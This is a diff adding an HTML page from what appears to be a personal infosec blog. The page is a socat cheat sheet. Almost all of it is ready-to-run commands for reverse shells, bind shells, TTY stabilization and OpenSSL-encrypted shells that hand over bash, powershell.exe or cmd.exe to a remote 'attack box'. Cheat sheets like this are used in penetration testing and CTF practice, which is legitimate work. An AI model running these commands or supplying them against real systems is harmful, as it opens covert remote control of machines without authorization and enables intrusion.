@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - chaos/tools-cheatsheets/socat</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <script src="/assets/js/zoom-images.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - chaos/tools-cheatsheets/socat"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-pfp.png"
+            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/now/">now</a>
+        <a href="/chaos/">chaos</a>
+        <a href="/phasm/">phasm</a>
+        <a href="/support/">support</a>
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/about/">about</a>
+      </nav>
+    </header>
+    <main>
+
+    
+    <h1>Socat</h1>
+
+<h2>Fully interactive TTY reverse shell</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># On attack box, run:</span>
+socat file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:4444
+
+<span class="c"># On your target, run:</span>
+socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:&lt;ip&gt;:4444
+</code></pre></div>
+
+<h2>Reverse shells</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Basic reverse shell listener:</span>
+socat TCP-L:&lt;port&gt; -
+
+<span class="c"># Connecting to the listener from windows:</span>
+socat TCP:&lt;local-ip&gt;:&lt;local-port&gt; EXEC:powershell.exe,pipes
+
+<span class="c"># Connecting to the listener from linux:</span>
+socat TCP:&lt;local-ip&gt;:&lt;local-port&gt; EXEC:<span class="s2">"bash -li"</span>
+</code></pre></div>
+
+<h2>Fully stable reverse shell on linux</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># First, set up the following listener:</span>
+socat TCP-L:&lt;port&gt; FILE:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0
+
+<span class="c"># Connect to the listener with your method of choice, netcat etc</span>
+<span class="c"># then, run this command to stabilize your shell:</span>
+socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:<span class="s2">"bash -li"</span>,pty,stderr,sigint,setsid,sane
+</code></pre></div>
+
+<h2>Bind shells</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># On a linux target:</span>
+socat TCP-L:&lt;port&gt; EXEC:<span class="s2">"bash -li"</span>
+
+<span class="c"># On a windows target:</span>
+socat TCP-L:&lt;port&gt; EXEC:powershell.exe,pipes
+
+<span class="c"># Connecting to the listener from your attack box:</span>
+socat TCP:&lt;target-ip&gt;:&lt;target-port&gt; -
+</code></pre></div>
+
+<h2>Encrypted shells</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># First, generate a certificate on your attack box:</span>
+openssl req <span class="nt">--newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-keyout</span> shell.key <span class="nt">-x509</span> <span class="nt">-days</span> 362 <span class="nt">-out</span> shell.crt
+
+<span class="c"># Concatenate the two files created:</span>
+<span class="nb">cat </span>shell.key shell.crt <span class="o">&gt;</span> shell.pem
+
+<span class="c"># Use the certificate for a reverse shell, set up the listener:</span>
+socat OPENSSL-LISTEN:&lt;port&gt;,cert<span class="o">=</span>shell.pem,verify<span class="o">=</span>0 -
+
+<span class="c"># Then connect back to the listener:</span>
+socat OPENSSL:&lt;local-ip&gt;:&lt;local-port&gt;,verify<span class="o">=</span>0 EXEC:/bin/bash
+
+<span class="c"># Or use the certificate for a bind shell, set up the listener on your target:</span>
+socat OPENSSL-LISTEN:&lt;port&gt;,cert<span class="o">=</span>shell.pem,verify<span class="o">=</span>0 EXEC:cmd.exe,pipes
+
+<span class="c"># Then connect from your attack box:</span>
+socat OPENSSL:&lt;target-ip&gt;:&lt;target-port&gt;,verify<span class="o">=</span>0 -
+</code></pre></div>
+
+    
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
